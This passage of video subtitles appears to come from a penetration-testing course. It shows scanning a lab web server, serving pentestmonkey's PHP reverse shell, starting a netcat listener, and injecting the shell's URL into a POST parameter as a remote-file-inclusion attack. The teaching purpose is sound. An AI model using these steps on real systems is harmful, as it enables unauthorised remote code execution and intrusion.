00:06:33.098\nHit Return, let that crank off.\n\n124\n00:06:33.098 --> 00:06:36.768\nWhile that's happening,\nI'll also fire off a Nitko scan.\n\n125\n00:06:36.768 --> 00:06:41.466\nNikto [LAUGH], man, I'm having\ntrouble with the whole words and\n\n126\n00:06:41.466 --> 00:06:44.980\nthe letter thing, putting them together.\n\n127\n00:06:44.980 --> 00:06:46.384\nMan, that's a real pain in the bum.\n\n128\n00:06:46.384 --> 00:06:53.531\nThere we go, -h for host,\n192.168.219.156, fire off Nikto.\n\n129\n00:06:53.531 --> 00:06:56.688\nSo one of these guys'll\nget done before the other.\n\n130\n00:06:56.688 --> 00:06:59.348\nAnd there we go,\nboth almost the exact same time here.\n\n131\n00:06:59.348 --> 00:07:04.134\nSo, we see in our Nmap scan,\nwe're doing our scanning here,\n\n132\n00:07:04.134 --> 00:07:06.630\nport 22 is open to SSH access.\n\n133\n00:07:06.630 --> 00:07:10.384\nWe might need that later,\nas we get beyond RFIs and things.\n\n134\n00:07:10.384 --> 00:07:13.282\nWe have, port 80 is open, all right.\n\n135\n00:07:13.282 --> 00:07:18.020\nWeb server is lighttpd 1.4.35.\n\n136\n00:07:18.020 --> 00:07:23.107\nAll great information for us to know\nas we are building up our vision,\n\n137\n00:07:23.107 --> 00:07:27.070\nour image,\nof what this system actually looks like.\n\n138\n00:07:27.070 --> 00:07:29.638\nLet's jump down here into Nikto.\n\n139\n00:07:31.460 --> 00:07:32.781\nLet's see what we find here.\n\n140\n00:07:32.781 --> 00:07:35.270\nGot the server again, lighttpd.\n\n141\n00:07:37.390 --> 00:07:39.465\nWhat else can we glean from this guy?\n\n142\n00:07:39.465 --> 00:07:42.042\nWe got an info.php that we can get to.\n\n143\n00:07:42.042 --> 00:07:42.915\nThe function was found.\n\n144\n00:07:44.815 --> 00:07:46.846\nThat could be good,\ninteresting information.\n\n145\n00:07:46.846 --> 00:07:47.837\nThere's some more stuff.\n\n146\n00:07:49.515 --> 00:07:52.306\nOutput from the phpinfo\nfunction was found, so\n\n147\n00:07:52.306 --> 00:07:55.736\nit did actually fire that off and\nfound some information.\n\n148\n00:07:56.873 --> 00:08:02.418\nAnd then here, info.php RFI\nfrom [INAUDIBLE] or From here.\n\n149\n00:08:02.418 --> 00:08:05.580\nSo it's saying that there might\nbe an RFI vulnerability here.\n\n150\n00:08:05.580 --> 00:08:09.690\nSo I see that in my scan specifically.\n\n151\n00:08:09.690 --> 00:08:11.300\nOkay, I'm gonna keep that\nin the back of my mind.\n\n152\n00:08:11.300 --> 00:08:13.450\nI've probably got a scratch\npiece of paper, or\n\n153\n00:08:13.450 --> 00:08:17.710\nmaybe a file off to the side where\nI'm typing into, saying, here are my\n\n154\n00:08:17.710 --> 00:08:21.960\npossible attack vectors that I've gleaned\nfrom my scanning and my enumeration.\n\n155\n00:08:21.960 --> 00:08:25.880\nSeeing RFI, maybe I've gone through\nsome different attack vectors and\n\n156\n00:08:25.880 --> 00:08:27.290\nI've gotten nowhere.\n\n157\n00:08:27.290 --> 00:08:28.900\nI might wanna jump on that and\n\n158\n00:08:28.900 --> 00:08:34.560\nsee RFI that could be a good way to go,\nI'll put that on my list of things to do.\n\n159\n00:08:34.560 --> 00:08:35.420\nAll right, let's see here.\n\n160\n00:08:35.420 --> 00:08:38.940\nWe've gone through some enumeration might\nalso want to run derbs to see if there's\n\n161\n00:08:38.940 --> 00:08:43.180\nany great directories we don't\nsee right out of the gates.\n\n162\n00:08:43.180 --> 00:08:45.400\nBut let's just start\ntalking about exploitation.\n\n163\n00:08:46.630 --> 00:08:48.920\nSo how do we exploit an RFI attack?\n\n164\n00:08:48.920 --> 00:08:51.120\nAnd that's a really good question.\n\n165\n00:08:51.120 --> 00:08:53.690\nA, there's some great tools out\nthere that will help you do that and\n\n166\n00:08:53.690 --> 00:08:55.240\nwe're gonna play with some of those,\nright?\n\n167\n00:08:55.240 --> 00:08:56.220\nThat's a good thing.\n\n168\n00:08:56.220 --> 00:09:00.250\nTools make our jobs easy and\nthat can be a very good thing,\n\n169\n00:09:00.250 --> 00:09:03.700\nespecially if this Is technically your\njob, it's something you're doing,\n\n170\n00:09:03.700 --> 00:09:06.880\nyou want to make it as efficient and\nstreamlined as possible.\n\n171\n00:09:06.880 --> 00:09:09.950\nSo it's good for us to use tools but\nalso you can do these things the manual\n\n172\n00:09:09.950 --> 00:09:14.180\nhard way, just so you can verify to\nyourself that you know how to do them.\n\n173\n00:09:14.180 --> 00:09:15.650\nAnd that's just always valid.\n\n174\n00:09:16.820 --> 00:09:20.130\nSo a couple things we're gonna talk\nabout when it comes to attacking tools.\n\n175\n00:09:20.130 --> 00:09:21.920\nThings I want you guys to download,\ninstall.\n\n176\n00:09:21.920 --> 00:09:26.300\nSo you definitely grab a cuz you're gonna\nneed it first to be able to practice this.\n\n177\n00:09:26.300 --> 00:09:29.410\nA couple of browser plug ins, right?\n\n178\n00:09:29.410 --> 00:09:32.690\nSome great tools again for Firefox and\nanother one in Firefox, I'm no so\n\n179\n00:09:32.690 --> 00:09:36.302\nsure about Chrome or IE but\ndefinitely run on Firefox.\n\n180\n00:09:36.302 --> 00:09:37.757\nThere's gonna be HackBar.\n\n181\n00:09:37.757 --> 00:09:38.860\nI love Hackbar.\n\n182\n00:09:38.860 --> 00:09:39.880\nMy goodness.\n\n183\n00:09:39.880 --> 00:09:41.590\nHackBar's a fantastic tool.\n\n184\n00:09:41.590 --> 00:09:44.870\nI love the stinking thing,\nwe're gonna use it in this.\n\n185\n00:09:44.870 --> 00:09:51.530\nAlso Tamper Data, which is a great piece\nof software, it's also a Firefox plugin.\n\n186\n00:09:51.530 --> 00:09:55.770\nIf you have Cowley running,\nyou will also have BurpSuite installed.\n\n187\n00:09:55.770 --> 00:10:01.706\nBurpSuite is an all-in-one Web\napp attack platform, fantastic,\n\n188\n00:10:01.706 --> 00:10:07.670\nfully featured suites of tools\nto against Web applications.\n\n189\n00:10:07.670 --> 00:10:11.560\nSo anyone of those guys could get you so\nthe golden ticket.\n\n190\n00:10:11.560 --> 00:10:14.620\nWe're gonna use a couple of them here and\njust show you how to use them.\n\n191\n00:10:14.620 --> 00:10:19.020\nAnd I'll make a drop really easy and\nthen, of course, we rehearse shells.\n\n192\n00:10:19.020 --> 00:10:22.710\nI've been hammering the whole\narm to revert shell.\n\n193\n00:10:22.710 --> 00:10:26.180\nI want them to pump\nback to me as shell but\n\n194\n00:10:26.180 --> 00:10:29.950\nyou might not be the greatest\nshell coach out there.\n\n195\n00:10:29.950 --> 00:10:30.740\nGuilty.\n\n196\n00:10:30.740 --> 00:10:34.460\nGuilty as charge, right,\nit's not the shame that is at all.\n\n197\n00:10:34.460 --> 00:10:35.860\nIt's not a bad thing.\n\n198\n00:10:35.860 --> 00:10:40.140\nFortunately, there are those great\nindividuals out there that realize that\n\n199\n00:10:40.140 --> 00:10:44.950\nnot everyone has their skills, so with\ngreat power comes great responsibility,\n\n200\n00:10:44.950 --> 00:10:46.305\nand they help us out with that.\n\n201\n00:10:46.305 --> 00:10:49.880\nOnsite, I'm gonna definitely recommend,\nlet's just jump to that really quickly so\n\n202\n00:10:49.880 --> 00:10:51.310\nyou can see it.\n\n203\n00:10:51.310 --> 00:10:53.140\nLet me open my Firefox browser.\n\n204\n00:10:54.450 --> 00:10:56.360\nAnd just do a Google search for.\n\n205\n00:10:56.360 --> 00:10:58.261\nActually, I'll just go to it.\n\n206\n00:10:58.261 --> 00:11:06.138\nIt's http://pentestmonkey.net [LAUGH].\n\n207\n00:11:06.138 --> 00:11:07.880\nYeah, great site.\n\n208\n00:11:07.880 --> 00:11:09.800\nLots of great information here.\n\n209\n00:11:09.800 --> 00:11:12.941\nLots of great scripts and tools and things\nthat he's made available or this person.\n\n210\n00:11:12.941 --> 00:11:18.131\nI don't know if it's a he or she or\na group of individuals that have put\n\n211\n00:11:18.131 --> 00:11:23.769\na great set of tools for you as a pen\ntester to take advantage of great stuff,\n\n212\n00:11:23.769 --> 00:11:28.712\ncheat sheets, shells,\nobviously,webshells,great stuff.\n\n213\n00:11:28.712 --> 00:11:33.627\nThe URL specifically we need\nto get to because I don't know\n\n214\n00:11:33.627 --> 00:11:37.439\nhow to navigate their without a URL,\ntools,\n\n215\n00:11:37.439 --> 00:11:41.896\nweb shells, dash shells-php-reverse-shell.\n\n216\n00:11:41.896 --> 00:11:44.870\nI think that's it.\n\n217\n00:11:44.870 --> 00:11:46.010\nYeah.\nThere we go.\n\n218\n00:11:46.010 --> 00:11:48.960\nThis is something you're\ngoing to want to download and\n\n219\n00:11:48.960 --> 00:11:51.910\nput into the web rot of your Apache or\n\n220\n00:11:51.910 --> 00:11:56.160\nin Jinx or wherever it is Web server,\nwhatever web server you're running,\n\n221\n00:11:56.160 --> 00:11:59.755\nput it in the web root there, cuz we're\ngonna be serving this up hot on a plate.\n\n222\n00:11:59.755 --> 00:12:00.390\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n223\n00:12:00.390 --> 00:12:01.710\nthat's what's gonna give us our web shell.\n\n224\n00:12:01.710 --> 00:12:04.570\nWe do need to modify\nthis code just a tad so\n\n225\n00:12:04.570 --> 00:12:07.230\nthat it will fit our function,\nas we need it to.\n\n226\n00:12:07.230 --> 00:12:09.870\nBut that should be pretty easy.\n\n227\n00:12:09.870 --> 00:12:11.510\nJust grab that TAR and download it.\n\n228\n00:12:13.270 --> 00:12:15.190\nAnd obviously, there's a walk through.\n\n229\n00:12:15.190 --> 00:12:16.210\nThank you so much guys.\n\n230\n00:12:16.210 --> 00:12:20.440\nI'm showing you exactly how to\nmodify the code if you need to and\n\n231\n00:12:20.440 --> 00:12:21.520\neven catch the reverse shell.\n\n232\n00:12:21.520 --> 00:12:25.700\nLook at it man, they've made it all one\nstop shopping right here at pentestmonkey.\n\n233\n00:12:25.700 --> 00:12:26.350\nTotally, love them.\n\n234\n00:12:26.350 --> 00:12:28.440\nSo grab that cuz we're gonna need it,\n\n235\n00:12:28.440 --> 00:12:32.350\nwe're gonna need it not in just\nthis episode, but in more beyond.\n\n236\n00:12:32.350 --> 00:12:34.060\nSo once you do that, like I said,\n\n237\n00:12:34.060 --> 00:12:37.700\nsave it to your web root,\nwe're going to play around with it.\n\n238\n00:12:37.700 --> 00:12:38.440\nWhere are we?\n\n239\n00:12:39.460 --> 00:12:42.310\nNow, we get to start our attack.\n\n240\n00:12:42.310 --> 00:12:43.990\nWe've run nit kill already.\n\n241\n00:12:43.990 --> 00:12:48.570\nWe found that RFI might be one of our\nattack vectors so we want to do that.\n\n242\n00:12:48.570 --> 00:12:52.340\nWe know it's obviously running PHP and\n\n243\n00:12:52.340 --> 00:12:55.480\nwe know it's running a web\nserver with PHP code.\n\n244\n00:12:55.480 --> 00:12:56.970\nSo let's go to our browser.\n\n245\n00:12:56.970 --> 00:12:59.950\nMan, all those browser hacking so much fun\n&gt;&gt; [LAUGH]\n\n246\n00:12:59.950 --> 00:13:01.520\n&gt;&gt; I love the fact that everybody and\n\n247\n00:13:01.520 --> 00:13:03.360\ntheir brother has a browser.\n\n248\n00:13:03.360 --> 00:13:05.010\n&gt;&gt; Yes.\n&gt;&gt; And so that means anybody and\n\n249\n00:13:05.010 --> 00:13:08.490\ntheir brother can hack.\n\n250\n00:13:08.490 --> 00:13:09.930\nIt's fun, it's a good time.\n\n251\n00:13:09.930 --> 00:13:15.130\nLet's go to our site, it was 156 if I'm\nnot mistaken, so 192.168.219.156, Return.\n\n252\n00:13:15.130 --> 00:13:16.440\nYep, there's good old Milnet.\n\n253\n00:13:17.650 --> 00:13:21.930\nArmy material command Seckenheim,\nDeutschland.\n\n254\n00:13:21.930 --> 00:13:25.510\nApparently, it's some German\nmilitary organization.\n\n255\n00:13:25.510 --> 00:13:27.517\nWe're going for\nthe big boys here, look at us.\n\n256\n00:13:27.517 --> 00:13:28.730\n&gt;&gt; [LAUGH]\n&gt;&gt; We're going crazy,\n\n257\n00:13:28.730 --> 00:13:34.100\nwe got a couple of buttons over here,\na Main, Bombay, and Props.\n\n258\n00:13:34.100 --> 00:13:37.840\nI think actually these\nare all the same link\n\n259\n00:13:37.840 --> 00:13:40.360\neven though you'll notice\nas I hover over them.\n\n260\n00:13:40.360 --> 00:13:42.890\nTypically, if you hover over a link,\nit'll tell you where that link goes to.\n\n261\n00:13:42.890 --> 00:13:44.260\nWe're not seeing any of that here.\n\n262\n00:13:46.830 --> 00:13:50.210\nBut if we go back to our\nNikto scan right here,\n\n263\n00:13:50.210 --> 00:13:54.460\nit gave us this info.php information.\n\n264\n00:13:54.460 --> 00:13:58.480\nNow, what that's telling\nus is that is a web\n\n265\n00:13:58.480 --> 00:14:03.330\ndirectory that it was able to a find and\neven go into and\n\n266\n00:14:03.330 --> 00:14:06.120\nyou might want to check it out there\nmight be interesting information there.\n\n267\n00:14:06.120 --> 00:14:06.710\nSo let's do that.\n\n268\n00:14:06.710 --> 00:14:10.376\nAll you have to do is add\nthat to your thing here.\n\n269\n00:14:10.376 --> 00:14:16.750\nSo info.php hit return and\nlook at that, it tells me,\n\n270\n00:14:16.750 --> 00:14:22.470\nPHP version 7.0.4-7 Ubuntu 2,\ngetting great info from the system.\n\n271\n00:14:22.470 --> 00:14:26.450\nRemember, that enumeration process\nis key gathering information.\n\n272\n00:14:26.450 --> 00:14:27.140\nYou gotta do that.\n\n273\n00:14:28.310 --> 00:14:32.250\nIf I scroll down,\nI just keep scrolling through here.\n\n274\n00:14:32.250 --> 00:14:39.859\nI'm gonna see some interesting\nstuff like right round this region.\n\n275\n00:14:41.190 --> 00:14:41.690\nLook at that.\n\n276\n00:14:43.060 --> 00:14:46.740\nSo, remember,\nwe said allow URLF Open Equals on.\n\n277\n00:14:46.740 --> 00:14:49.590\nIt's letting me know\nURLF open does equal on.\n\n278\n00:14:49.590 --> 00:14:51.730\nSo does allow URL underscore include.\n\n279\n00:14:52.790 --> 00:14:55.560\nIncludes are allowed, so\nwe might have includes in here.\n\n280\n00:14:55.560 --> 00:14:57.490\nThat's why Nick was telling us, hey,\n\n281\n00:14:57.490 --> 00:14:59.810\nRFI might be a thing that\nyou want to look into.\n\n282\n00:14:59.810 --> 00:15:00.650\nAll right.\nSo that's good.\n\n283\n00:15:00.650 --> 00:15:05.710\nWe know that at least it's capable of\ndoing it, but are we capable of doing it?\n\n284\n00:15:05.710 --> 00:15:06.250\nIt says create info.\n\n285\n00:15:06.250 --> 00:15:13.700\nSo we go browsing back to the main\npage here and let's see here.\n\n286\n00:15:13.700 --> 00:15:14.980\nOne of the things you definitely wanna do,\n\n287\n00:15:14.980 --> 00:15:18.280\none you definitely when you're working\nwith websites, look at the source code.\n\n288\n00:15:18.280 --> 00:15:21.270\nYou never know what kind of good\ninformation might be gleaned\n\n289\n00:15:21.270 --> 00:15:22.920\nby just looking at the source code.\n\n290\n00:15:22.920 --> 00:15:27.400\nSo I'll just right click View page source.\n\n291\n00:15:27.400 --> 00:15:31.390\nThere you go.\nI've get a couple of web links here.\n\n292\n00:15:31.390 --> 00:15:34.040\nFrame source equals nab dot PHP.\n\n293\n00:15:34.040 --> 00:15:39.070\nThere's a nab.PHP and a main.PHP link.\n\n294\n00:15:39.070 --> 00:15:42.000\nThose are pages that I can browse to.\n\n295\n00:15:42.000 --> 00:15:47.877\nAll I have to do is go up into\nthe browser and say /nav.php.\n\n296\n00:15:47.877 --> 00:15:50.160\nLike that.\n\n297\n00:15:50.160 --> 00:15:51.050\nOkay.\nSo that's that\n\n298\n00:15:51.050 --> 00:15:53.850\nframe over there on the left\nside is the nav.php link.\n\n299\n00:15:53.850 --> 00:15:54.711\nThat's where it takes you.\n\n300\n00:15:54.711 --> 00:15:58.024\nSo this is a framed website using frames.\n\n301\n00:15:58.024 --> 00:16:00.458\nAnd the other was main.php.\n\n302\n00:16:00.458 --> 00:16:02.010\nSo let's just see what that does.\n\n303\n00:16:05.104 --> 00:16:09.250\nThere we go, so that's the two\nsides of the coin right there.\n\n304\n00:16:09.250 --> 00:16:12.480\nNot a whole lot going on though,\nnothing crazy here.\n\n305\n00:16:14.400 --> 00:16:20.210\nLet's view the source on the main page,\nlet's see, View page source.\n\n306\n00:16:20.210 --> 00:16:24.283\nOkay, there is nothing,\nit does have this image,\n\n307\n00:16:24.283 --> 00:16:29.413\nalign center but not a lot of context,\nnot a lot of information.\n\n308\n00:16:29.413 --> 00:16:33.880\nSo this is really kinda letting us\ndown as far as the information goes.\n\n309\n00:16:35.310 --> 00:16:39.287\nLet's go back to that ,let's view\nthat nav, see what that gives us.\n\n310\n00:16:41.248 --> 00:16:44.050\nOkay, little more information here.\n\n311\n00:16:44.050 --> 00:16:46.010\nSee we've, this is good.\n\n312\n00:16:46.010 --> 00:16:47.964\nSo, we've got this right here,\nthis form method=post.\n\n313\n00:16:47.964 --> 00:16:52.127\nSo this is post data, we're actually\ngiving it some instructions,\n\n314\n00:16:52.127 --> 00:16:53.790\nwhich is a button, right?\n\n315\n00:16:53.790 --> 00:16:57.160\nSo you click a button,\nit's saying this button does this.\n\n316\n00:16:57.160 --> 00:17:00.416\nThe action is take me to content.php.\n\n317\n00:17:00.416 --> 00:17:05.220\nThe value=main, so\nthat's why it says main on that button.\n\n318\n00:17:05.220 --> 00:17:07.510\nThere's bomb and props.\n\n319\n00:17:07.510 --> 00:17:12.235\nSo they all take me to content.php,\nthat's good information to know.\n\n320\n00:17:12.235 --> 00:17:15.100\nContent.php is obviously a page.\n\n321\n00:17:15.100 --> 00:17:17.698\nI wonder what the heck is on content.php?\n\n322\n00:17:17.698 --> 00:17:19.785\n&gt;&gt; Well, let's find out.\n\n323\n00:17:19.785 --> 00:17:23.849\n&gt;&gt; Yeah, let's do that very thing.\n\n324\n00:17:23.849 --> 00:17:31.630\nLet's see here, let's go to content.php,\nit's the same thing, just like main.\n\n325\n00:17:31.630 --> 00:17:34.140\nSo, it's basically\na copy of the main page.\n\n326\n00:17:34.140 --> 00:17:37.200\nOr maybe an alias or\nsomething of that fact.\n\n327\n00:17:37.200 --> 00:17:38.360\nAll right, go back here.\n\n328\n00:17:38.360 --> 00:17:41.040\nI do like knowing that is there, so\nwe've got content, we've got main,\n\n329\n00:17:41.040 --> 00:17:45.894\nwe've got nav.php and info.php.\n\n330\n00:17:45.894 --> 00:17:47.820\nSo let's see here, what else do we got?\n\n331\n00:17:47.820 --> 00:17:49.303\nWhat do we wanna do next here?\n\n332\n00:17:50.898 --> 00:17:55.090\nLet's do some source code peeping.\n\n333\n00:17:55.090 --> 00:17:59.700\nSo we can use a command line tool\ncalled cURL, to see if there's\n\n334\n00:17:59.700 --> 00:18:03.575\nmaybe almost something extra we are not\nseeing in the graphical representation,\n\n335\n00:18:03.575 --> 00:18:05.490\nright, that could be a problem.\n\n336\n00:18:05.490 --> 00:18:06.483\nSo let's just use our command line tool.\n\n337\n00:18:06.483 --> 00:18:11.458\nLets say, curl -v and you say,\n\n338\n00:18:11.458 --> 00:18:19.210\nhttp://192.168.219.156.\n\n339\n00:18:19.210 --> 00:18:22.548\nAnd then,\nwe'll do nav because that one had so\n\n340\n00:18:22.548 --> 00:18:26.924\nmuch good information there,\nlet's see what's going on.\n\n341\n00:18:26.924 --> 00:18:30.719\nAnd it looks like curl done premature,\n\n342\n00:18:30.719 --> 00:18:35.319\nI think there's any\ndifference going on here,\n\n343\n00:18:35.319 --> 00:18:39.689\nI can move this over make\na lot easier to view,\n\n344\n00:18:39.689 --> 00:18:43.050\nyeah, so that's content.php.\n\n345\n00:18:43.050 --> 00:18:44.930\nBut that's interesting to me.\n\n346\n00:18:44.930 --> 00:18:46.420\nIt keeps taking me to the same page,\n\n347\n00:18:46.420 --> 00:18:50.220\nthat page is a very important\napparently to this site.\n\n348\n00:18:50.220 --> 00:18:51.700\nSo, I wanna keep that\non the back of my head.\n\n349\n00:18:51.700 --> 00:18:54.820\nAnd the fact that it's doing post\ncommands, that's also very good.\n\n350\n00:18:54.820 --> 00:19:00.500\nIt's posting to that page via that\nnav.php buttons, that's a good stuff.\n\n351\n00:19:01.810 --> 00:19:04.420\nSo let's do this, let's go ahead and,\nI remember I talked about\n\n352\n00:19:04.420 --> 00:19:08.650\nthe php-reverse-shell that we\ndownloaded from pentestmonkey,\n\n353\n00:19:08.650 --> 00:19:12.440\nlet's go ahead and get that ready,\nbecause I think I found my attack vector.\n\n354\n00:19:12.440 --> 00:19:17.940\nThat post is letting me think\nthat's where we're going to\n\n355\n00:19:17.940 --> 00:19:22.490\nfire off this attack, cuz I'm gonna\ntry to inject into that post data.\n\n356\n00:19:23.910 --> 00:19:28.430\nSo let's do that, let's, I know I have,\nlet me see if I kept it here, nope.\n\n357\n00:19:28.430 --> 00:19:31.490\nI'll go to, where is it?\n\n358\n00:19:31.490 --> 00:19:33.630\nIt's in my web root, [LAUGH].\n\n359\n00:19:33.630 --> 00:19:38.814\nSo let's see here, cd /var,\ncuz I'm running Apache,\n\n360\n00:19:38.814 --> 00:19:43.890\nvar/www/html, ls, I know,\nI think I called it php.\n\n361\n00:19:43.890 --> 00:19:49.687\nI think it left it the same name,\nphpshell, phpshell.\n\n362\n00:19:49.687 --> 00:19:53.204\nI also have it saved as php-reverse-shell,\nphpshell,\n\n363\n00:19:53.204 --> 00:19:55.825\napparently, I play with this a few times.\n\n364\n00:19:55.825 --> 00:19:57.370\n&gt;&gt; [LAUGH]\n&gt;&gt; Once or twice, just a hare,\n\n365\n00:19:57.370 --> 00:19:58.020\njust a hare.\n\n366\n00:19:59.030 --> 00:20:06.040\nLet's take a look inside of it so,\ncat phpshell.php.\n\n367\n00:20:06.040 --> 00:20:10.100\nAnd what's interesting about this,\ndo this for\n\n368\n00:20:10.100 --> 00:20:15.030\nyou guys, let's go up to the top here,\nit's very easy to modify to\n\n369\n00:20:15.030 --> 00:20:19.340\nget it to do what you want it to do, cuz\nthere's only a few things you have to do.\n\n370\n00:20:19.340 --> 00:20:23.285\nChange this and change this,\nwhat IP does it need to try to contact and\n\n371\n00:20:23.285 --> 00:20:25.406\nat what port does it need to contact.\n\n372\n00:20:25.406 --> 00:20:29.420\nYou know me, I like 9999,\nso that's what I put there.\n\n373\n00:20:29.420 --> 00:20:34.249\nThis is the IP of my Kali box, so\nthat's where I'm going to be listening.\n\n374\n00:20:34.249 --> 00:20:40.330\nSo, change your PHP shell as necessary for\nyour environment.\n\n375\n00:20:40.330 --> 00:20:43.990\nAnd that's basically it for this,\nwe don't have to do anything else.\n\n376\n00:20:43.990 --> 00:20:46.410\nLet's see, now that we have that,\n\n377\n00:20:46.410 --> 00:20:49.060\nI'm following my notes here because\nit's easy to forget a skip.\n\n378\n00:20:49.060 --> 00:20:52.120\nAnd I just want to guide you guys\nthrough this very easily and quickly.\n\n379\n00:20:53.843 --> 00:20:55.670\nWe got PHP, we're putting it there.\n\n380\n00:20:55.670 --> 00:21:00.390\nMake sure that your Apache service is\nstarted, that's always a good idea.\n\n381\n00:21:00.390 --> 00:21:06.290\nYou can do that with\nservice apache2 restart,\n\n382\n00:21:06.290 --> 00:21:09.810\nthat just verifies that it started right,\nthat it came through, no errors.\n\n383\n00:21:11.520 --> 00:21:12.841\nWhat else do we need to do?\n\n384\n00:21:12.841 --> 00:21:15.430\nWe need to, works with our environment,\nwe're good with that.\n\n385\n00:21:15.430 --> 00:21:17.060\nWe started a net cat listener,\nlet's go ahead and\n\n386\n00:21:17.060 --> 00:21:19.540\ndo that cuz it can be sitting\naround waiting for us.\n\n387\n00:21:19.540 --> 00:21:25.410\nnc -nvlp and on port 9999, Enter.\n\n388\n00:21:25.410 --> 00:21:33.860\nI am going to now reduce this in size back\ndown to kinda where it was, there we go.\n\n389\n00:21:33.860 --> 00:21:35.910\nAll right, so let's go ahead and\n\n390\n00:21:35.910 --> 00:21:41.100\nlet's start playing around with\nour tampered data, let's do that.\n\n391\n00:21:41.100 --> 00:21:44.830\nSo if you got that guide installed,\ngo ahead and fire up,\n\n392\n00:21:44.830 --> 00:21:48.420\nTools and it should be right there,\nminus this tampered data and\n\n393\n00:21:48.420 --> 00:21:52.810\nit gives us this option,\nbasically to start tampering.\n\n394\n00:21:52.810 --> 00:21:57.160\nSo what this is gonna do is it's gonna\nintercept any requests we make to\n\n395\n00:21:57.160 --> 00:22:02.320\na website allowing us to modify them\nbefore it actually sends them off.\n\n396\n00:22:02.320 --> 00:22:03.105\n&gt;&gt; That's a beautiful thing.\n\n397\n00:22:03.105 --> 00:22:04.320\n&gt;&gt; It is a beautiful thing and\n\n398\n00:22:04.320 --> 00:22:07.070\nit seems like, well,\nwhat's the big deal about that?\n\n399\n00:22:07.070 --> 00:22:10.350\nBecause websites typically\ndon't allow you to modify\n\n400\n00:22:10.350 --> 00:22:13.810\nthings after you've hit the send button or\nsubmit button or whatever.\n\n401\n00:22:13.810 --> 00:22:15.630\nThis is allowing us to do this,\nintercepting it,\n\n402\n00:22:15.630 --> 00:22:20.810\nbasically acting as a proxy, to go through\nthem so that we can see all that and\n\n403\n00:22:20.810 --> 00:22:25.260\nthen change any information to our liking\nbefore it actually hits the web server.\n\n404\n00:22:25.260 --> 00:22:26.250\nSo this is a very powerful tool.\n\n405\n00:22:26.250 --> 00:22:30.120\n&gt;&gt; Absolutely, if you think about what's\nactually happening there, any processing\n\n406\n00:22:30.120 --> 00:22:36.040\nthat was done on the browser side,\nany of those client-side checks,\n\n407\n00:22:36.040 --> 00:22:40.380\ninput validation or sanitization, things\nlike that, all that's already happened.\n\n408\n00:22:40.380 --> 00:22:44.860\nNow, the packet's been formulated and it's\nbeing sent, and now we're modifying it.\n\n409\n00:22:44.860 --> 00:22:49.930\nSo, if there aren't any, sometimes these\nadmins will not that they get lazy,\n\n410\n00:22:49.930 --> 00:22:53.090\nbut it's like, all right, we've already\ndone our checks on the client-side,\n\n411\n00:22:53.090 --> 00:22:56.130\nwhy do I need to do checks again\non the server-side, right?\n\n412\n00:22:56.130 --> 00:22:57.240\nSo, they maybe don't do that.\n\n413\n00:22:57.240 --> 00:22:59.506\nAnd we're getting to modify that\ndata before it hits the server.\n\n414\n00:22:59.506 --> 00:23:02.237\nAnd if you find a web\nserver that supports post,\n\n415\n00:23:02.237 --> 00:23:06.267\nwhich is basically a web server that\nsays hey, you must accept data and\n\n416\n00:23:06.267 --> 00:23:10.300\nstore data that's found in these packets,\nwe're off to the races.\n\n417\n00:23:10.300 --> 00:23:11.720\n&gt;&gt; Yes, exactly right.\n\n418\n00:23:11.720 --> 00:23:13.600\nSo, let's see what that looks like.\n\n419\n00:23:13.600 --> 00:23:14.840\nThis will be a lot of fun.\n\n420\n00:23:14.840 --> 00:23:16.169\nSo, we are tampering with our data.\n\n421\n00:23:16.169 --> 00:23:19.662\nWe're just gonna go ahead and\nshrink this out of the way very quickly.\n\n422\n00:23:19.662 --> 00:23:25.380\nI wanna go back to that main page here,\njust the actual initial page that we get.\n\n423\n00:23:28.910 --> 00:23:30.010\nI'll Submit this.\n\n424\n00:23:30.010 --> 00:23:34.000\nYou're starting to see that tampered data\nis intercepting everything that I'm doing\n\n425\n00:23:34.000 --> 00:23:38.120\nas far as my website goes now or\nmy web use should I say.\n\n426\n00:23:39.230 --> 00:23:40.670\nRight now,\nI just wanna go to the web page so\n\n427\n00:23:40.670 --> 00:23:43.180\nI'm just letting it submit I'm\nnot actually tampering with it.\n\n428\n00:23:43.180 --> 00:23:47.880\nYou're starting to see it log\nevery submission though, right?\n\n429\n00:23:47.880 --> 00:23:48.780\nSo, just keep that in mind.\n\n430\n00:23:48.780 --> 00:23:50.451\nGet this out of the way.\n\n431\n00:23:50.451 --> 00:23:52.860\nThis is where I wanna go,\nI'm gonna click on this.\n\n432\n00:23:52.860 --> 00:23:59.973\nAnd notice it's taking me to\ncontent.php cuz remember,\n\n433\n00:23:59.973 --> 00:24:06.950\nwhen we looked at that nav So\nI'm gonna tamper with that.\n\n434\n00:24:08.270 --> 00:24:09.380\nAnd here we go.\n\n435\n00:24:09.380 --> 00:24:11.860\nSo now over here is our post value.\n\n436\n00:24:11.860 --> 00:24:15.173\nSee, post parameter value as\nthis route value and then main.\n\n437\n00:24:15.173 --> 00:24:18.996\nWell, guess what, instead of main,\nlet's take a look and\n\n438\n00:24:18.996 --> 00:24:23.610\nlet's point it toward my server\nwhere that reverse PHP show is.\n\n439\n00:24:23.610 --> 00:24:24.670\nHow about that?\n\n440\n00:24:24.670 --> 00:24:31.927\nSo we'll say, http://192.168.219.146 and\n\n441\n00:24:31.927 --> 00:24:35.042\nwe'll say phpshell.php.\n\n442\n00:24:35.042 --> 00:24:38.470\nAnd then we'll hit OK.\n\n443\n00:24:40.100 --> 00:24:43.830\nNow let's take a look at our shell.\n\n444\n00:24:43.830 --> 00:24:45.670\nEverything went through.\n\n445\n00:24:45.670 --> 00:24:46.750\nShrink it down.\n\n446\n00:24:46.750 --> 00:24:48.130\nLook at that.\n\n447\n00:24:48.130 --> 00:24:49.796\nNo shell.\nHm, so that means there's\n\n448\n00:24:49.796 --> 00:24:51.350\na problem, right?\n\n449\n00:24:51.350 --> 00:24:55.410\nSo there's either a problem of\nthis post isn't really working or\n\n450\n00:24:55.410 --> 00:24:56.800\nI've got a problem maybe with Apache.\n\n451\n00:24:56.800 --> 00:25:00.386\nLet's check the Apache logs and\nsee if it actually made a connection.\n\n452\n00:25:00.386 --> 00:25:04.880\nSo I'll cat/var/logs\n\n453\n00:25:04.880 --> 00:25:09.374\nwritelog/apache2 and\n\n454\n00:25:09.374 --> 00:25:13.020\nthen access.log.\n\n455\n00:25:13.020 --> 00:25:19.540\nWell, there's the last log right\nthere saying, that's interesting.\n\n456\n00:25:19.540 --> 00:25:20.300\nI do.\n\n457\n00:25:20.300 --> 00:25:22.448\nIf you're looking at the screen\nhopefully it's caught your eyes,\n\n458\n00:25:22.448 